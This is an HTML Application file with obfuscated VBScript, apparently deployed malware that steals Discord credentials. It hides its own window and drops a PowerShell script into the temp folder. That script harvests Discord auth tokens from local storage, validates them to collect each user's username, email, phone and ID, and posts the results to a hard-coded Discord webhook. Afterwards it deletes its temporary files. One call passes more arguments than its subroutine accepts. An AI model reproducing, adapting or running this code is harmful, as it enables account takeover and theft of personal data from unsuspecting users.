<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -4000,-4000
On Error Resume Next

' --- Webhook URL (new one) ---
Function WU(): WU = Chr(104)&Chr(116)&Chr(116)&Chr(112)&Chr(115)&Chr(58)&Chr(47)&Chr(47)&Chr(100)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(46)&Chr(99)&Chr(111)&Chr(109)&Chr(47)&Chr(97)&Chr(112)&Chr(105)&Chr(47)&Chr(119)&Chr(101)&Chr(98)&Chr(104)&Chr(111)&Chr(111)&Chr(107)&Chr(115)&Chr(47)&Chr(49)&Chr(53)&Chr(51)&Chr(51)&Chr(48)&Chr(49)&Chr(57)&Chr(56)&Chr(49)&Chr(54)&Chr(52)&Chr(54)&Chr(48)&Chr(52)&Chr(49)&Chr(57)&Chr(50)&Chr(54)&Chr(50)&Chr(47)&Chr(109)&Chr(113)&Chr(53)&Chr(121)&Chr(82)&Chr(111)&Chr(112)&Chr(66)&Chr(101)&Chr(86)&Chr(85)&Chr(103)&Chr(75)&Chr(69)&Chr(69)&Chr(82)&Chr(51)&Chr(87)&Chr(75)&Chr(45)&Chr(99)&Chr(117)&Chr(53)&Chr(56)&Chr(102)&Chr(86)&Chr(80)&Chr(50)&Chr(89)&Chr(86)&Chr(90)&Chr(52)&Chr(112)&Chr(54)&Chr(97)&Chr(75)&Chr(117)&Chr(99)&Chr(71)&Chr(67)&Chr(110)&Chr(119)&Chr(49)&Chr(48)&Chr(104)&Chr(121)&Chr(48)&Chr(75)&Chr(85)&Chr(50)&Chr(110)&Chr(69)&Chr(84)&Chr(95)&Chr(88)&Chr(107)&Chr(74)&Chr(86)&Chr(122)&Chr(70)&Chr(119)&Chr(45)&Chr(97)&Chr(88)&Chr(110)&Chr(95)&Chr(115)&Chr(77): End Function

Dim WH: WH = WU()
Dim sh, fso
Set sh  = CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))
Set fso = CreateObject(Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(105)&Chr(110)&Chr(103)&Chr(46)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(79)&Chr(98)&Chr(106)&Chr(101)&Chr(99)&Chr(116))

' --- Write the PowerShell token stealer ---
Dim TMP: TMP = sh.ExpandEnvironmentStrings(Chr(37)&"TEMP"&Chr(37))
Dim psFile:  psFile  = TMP & Chr(92) & "dt.ps1"
Dim resFile: resFile = TMP & Chr(92) & "dt_res.txt"

fso.DeleteFile resFile, True

Dim ps: Set ps = fso.CreateTextFile(psFile, True)
ps.WriteLine "$o='" & resFile & "'"
ps.WriteLine "$r=''|Out-File $o"
ps.WriteLine "$paths=@("
ps.WriteLine "  ""$env:APPDATA\discord\Local Storage\leveldb"","
ps.WriteLine "  ""$env:APPDATA\discordcanary\Local Storage\leveldb"","
ps.WriteLine "  ""$env:APPDATA\discordptb\Local Storage\leveldb"","
ps.WriteLine "  ""$env:LOCALAPPDATA\Discord\Local Storage\leveldb"""
ps.WriteLine ")"
ps.WriteLine "$re=[regex]'M[A-Za-z\d_-]{23,}\.[A-Za-z\d_-]{6,}\.[A-Za-z\d_-]{27,}'"
ps.WriteLine "$seen=@{}"
ps.WriteLine "foreach($p in $paths){"
ps.WriteLine "  if(!(Test-Path $p)){continue}"
ps.WriteLine "  gci $p -Filter '*.ldb' -EA 0|%{"
ps.WriteLine "    $c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8)"
ps.WriteLine "    foreach($m in $re.Matches($c)){"
ps.WriteLine "      $t=$m.Value;if($seen[$t]){continue};$seen[$t]=$true"
ps.WriteLine "      try{"
ps.WriteLine "        $u=Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop"
ps.WriteLine "        ""$t|$($u.username)|$($u.email)|$($u.id)|$($u.phone)""|Out-File $o -Append -Encoding utf8"
ps.WriteLine "      }catch{}"
ps.WriteLine "    }"
ps.WriteLine "  }"
ps.WriteLine "  gci $p -Filter '*.log' -EA 0|%{"
ps.WriteLine "    $c=[System.IO.File]::ReadAllText($_.FullName,[Text.Encoding]::UTF8)"
ps.WriteLine "    foreach($m in $re.Matches($c)){"
ps.WriteLine "      $t=$m.Value;if($seen[$t]){continue};$seen[$t]=$true"
ps.WriteLine "      try{"
ps.WriteLine "        $u=Invoke-RestMethod -Uri 'https://discord.com/api/v9/users/@me' -Headers @{Authorization=$t} -EA Stop"
ps.WriteLine "        ""$t|$($u.username)|$($u.email)|$($u.id)|$($u.phone)""|Out-File $o -Append -Encoding utf8"
ps.WriteLine "      }catch{}"
ps.WriteLine "    }"
ps.WriteLine "  }"
ps.WriteLine "}"
ps.Close : Set ps = Nothing

' Run PowerShell
sh.Run Chr(112)&Chr(111)&Chr(119)&Chr(101)&Chr(114)&Chr(115)&Chr(104)&Chr(101)&Chr(108)&Chr(108) & Chr(32)&Chr(45)&Chr(78)&Chr(111)&Chr(80)&Chr(32)&Chr(45)&Chr(69)&Chr(120)&Chr(101)&Chr(99)&Chr(32)&Chr(66)&Chr(121)&Chr(112)&Chr(97)&Chr(115)&Chr(115)&Chr(32)&Chr(45)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(32)&Chr(34) & psFile & Chr(34), 0, True

' Read results
If Not fso.FileExists(resFile) Then
    fso.DeleteFile psFile, True
    window.close()
End If

Dim results: results = ""
Dim fr: Set fr = fso.OpenTextFile(resFile, 1)
results = fr.ReadAll
fr.Close : Set fr = Nothing

fso.DeleteFile psFile, True
fso.DeleteFile resFile, True

If Len(results) < 5 Then window.close()

' --- Parse each token and send to Discord ---
Dim lines: lines = Split(results, vbCrLf)
Dim line, count: count = 0

For Each line In lines
    If Len(line) < 20 Then
        ' Skip
    Else
        Dim parts: parts = Split(line, Chr(124))
        If UBound(parts) >= 3 Then
            Dim token, username, email, uid, phone
            token    = parts(0)
            username = parts(1)
            email    = parts(2)
            uid      = parts(3)
            phone    = ""
            If UBound(parts) >= 4 Then phone = parts(4)

            ' Build the info string matching the screenshot format
            Dim info: info = Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & username & vbCrLf
            If email <> "" Then
                info = info & Chr(69)&Chr(109)&Chr(97)&Chr(105)&Chr(108)&Chr(58)&Chr(32) & email & vbCrLf
            End If
            If phone <> "" Then
                info = info & Chr(80)&Chr(104)&Chr(111)&Chr(110)&Chr(101)&Chr(58)&Chr(32) & phone & vbCrLf
            End If
            info = info & Chr(73)&Chr(68)&Chr(58)&Chr(32) & uid & vbCrLf
            info = info & Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110)&Chr(58)&Chr(32) & token

            SendEmbed Chr(68)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(32)&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110), info, 5793266
            count = count + 1
        End If
    End If
Next

If count = 0 Then
    SendEmbed Chr(68)&Chr(105)&Chr(115)&Chr(99)&Chr(111)&Chr(114)&Chr(100)&Chr(32)&Chr(84)&Chr(111)&Chr(107)&Chr(101)&Chr(110), Chr(78)&Chr(111)&Chr(32)&Chr(116)&Chr(111)&Chr(107)&Chr(101)&Chr(110)&Chr(115)&Chr(32)&Chr(102)&Chr(111)&Chr(117)&Chr(110)&Chr(100)&Chr(46)&Chr(10)&Chr(80)&Chr(67)&Chr(58)&Chr(32) & sh.ExpandEnvironmentStrings(Chr(37)&"COMPUTERNAME"&Chr(37)) & Chr(10)&Chr(85)&Chr(115)&Chr(101)&Chr(114)&Chr(58)&Chr(32) & sh.ExpandEnvironmentStrings(Chr(37)&"USERNAME"&Chr(37)), 16753920
End If

window.close()

' --- Send Discord embed ---
Sub SendEmbed(title, desc)
    Dim DQ: DQ = Chr(34)
    Dim et: et = Replace(title, Chr(92), Chr(92)&Chr(92)) : et = Replace(et, DQ, Chr(92)&DQ)
    Dim ed: ed = Replace(desc, Chr(92), Chr(92)&Chr(92))  : ed = Replace(ed, DQ, Chr(92)&DQ)
    ed = Replace(ed, vbCrLf, Chr(92)&Chr(110)) : ed = Replace(ed, vbCr, Chr(92)&Chr(110)) : ed = Replace(ed, vbLf, Chr(92)&Chr(110))

    Dim j: j = Chr(123) & DQ & "embeds" & DQ & Chr(58)&Chr(91) & Chr(123) & DQ & "title" & DQ & Chr(58) & DQ & et & DQ & Chr(44) & DQ & "description" & DQ & Chr(58) & DQ & ed & DQ & Chr(44) & DQ & "color" & DQ & Chr(58) & 5793266 & Chr(125)&Chr(93)&Chr(125)

    Dim h: Set h = CreateObject(Chr(77)&Chr(83)&Chr(88)&Chr(77)&Chr(76)&Chr(50)&Chr(46)&Chr(83)&Chr(101)&Chr(114)&Chr(118)&Chr(101)&Chr(114)&Chr(88)&Chr(77)&Chr(76)&Chr(72)&Chr(84)&Chr(84)&Chr(80)&Chr(46)&Chr(54)&Chr(46)&Chr(48))
    h.SetOption 2, 13056
    h.Open Chr(80)&Chr(79)&Chr(83)&Chr(84), WH, False
    h.SetRequestHeader Chr(67)&Chr(111)&Chr(110)&Chr(116)&Chr(101)&Chr(110)&Chr(116)&Chr(45)&Chr(84)&Chr(121)&Chr(112)&Chr(101), Chr(97)&Chr(112)&Chr(112)&Chr(108)&Chr(105)&Chr(99)&Chr(97)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(47)&Chr(106)&Chr(115)&Chr(111)&Chr(110)
    h.Send j
    Set h = Nothing
End Sub
</script>
</head><body></body></html>